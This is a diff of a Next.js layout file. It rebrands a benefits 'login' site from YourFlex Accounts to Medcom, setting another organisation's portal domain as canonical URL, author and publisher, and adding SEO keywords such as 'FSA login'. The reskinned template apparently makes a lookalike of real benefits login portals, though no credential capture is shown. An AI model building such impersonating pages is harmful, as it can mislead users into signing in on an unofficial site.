@@ -2,27 +2,28 @@ import type React from "react";
 import type { Metadata } from "next";
 import { Geist } from "next/font/google";
 import { Analytics } from "@vercel/analytics/next";
+import { MedcomHeader } from "@/components/medcom-header";
 import "./globals.css";
 
 const geist = Geist({ subsets: ["latin"] });
 
 const CANONICAL_LOGIN_URL =
-  "https://yourflexaccounts.aptia365.com/Authentication/Handshake";
-const SITE_DOMAIN = "yourflexaccounts.aptia365.com";
-const SITE_BRAND = "YourFlex Accounts";
+  "https://medcom.wealthcareportal.com/Authentication/Handshake";
+const SITE_DOMAIN = "medcom.wealthcareportal.com";
+const SITE_BRAND = "Medcom";
 
 export const metadata: Metadata = {
   metadataBase: new URL(
     process.env.NEXT_PUBLIC_BASE_URL || CANONICAL_LOGIN_URL,
   ),
   title: {
-    default: "YourFlex Accounts - Login",
-    template: "%s | YourFlex Accounts",
+    default: "Medcom - Login",
+    template: "%s | Medcom",
   },
   keywords: [
-    "YourFlex Accounts",
-    "Aptia 365",
-    "yourflexaccounts.aptia365.com",
+    "Medcom",
+    "WealthCare Portal",
+    "medcom.wealthcareportal.com",
     "benefits login",
     "employee benefits portal",
     "FSA login",
@@ -37,11 +38,11 @@ export const metadata: Metadata = {
     "employer portal",
     "handshake authentication"
   ],
-  description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through YourFlex Accounts.`,
+  description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through Medcom.`,
 
-  authors: [{ name: "YourFlex Accounts" }],
-  creator: "YourFlex Accounts",
-  publisher: "YourFlex Accounts",
+  authors: [{ name: "Medcom" }],
+  creator: "Medcom",
+  publisher: "Medcom",
   applicationName: SITE_BRAND,
   referrer: "origin-when-cross-origin",
   robots: {
@@ -58,8 +59,8 @@ export const metadata: Metadata = {
   openGraph: {
     type: "website",
     locale: "en_US",
-    title: "YourFlex Accounts - Login",
-    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through YourFlex Accounts.`,
+    title: "Medcom - Login",
+    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through Medcom.`,
     siteName: SITE_BRAND,
     url: CANONICAL_LOGIN_URL,
     images: [
@@ -73,8 +74,8 @@ export const metadata: Metadata = {
   },
   twitter: {
     card: "summary",
-    title: "YourFlex Accounts - Login",
-    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through YourFlex Accounts.`,
+    title: "Medcom - Login",
+    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through Medcom.`,
     images: ["/favicon-32x32.png"],
   },
   icons: {
@@ -106,10 +107,10 @@ const jsonLd = {
   name: SITE_BRAND,
   url: CANONICAL_LOGIN_URL,
   description:
-    "YourFlex Accounts sign in portal. Login to manage your health and dependent care benefits, view account resources, and access your YourFlex Accounts profile.",
+    "Medcom sign in portal. Login to manage your health and dependent care benefits, view account resources, and access your Medcom profile.",
   publisher: {
     "@type": "Organization",
-    name: "YourFlex Accounts",
+    name: "Medcom",
   },
   inLanguage: "en-US",
   potentialAction: {
@@ -137,6 +138,7 @@ export default function RootLayout({
           type="application/ld+json"
           dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }}
         />
+        <MedcomHeader />
         {children}
         <Analytics />
       </body>
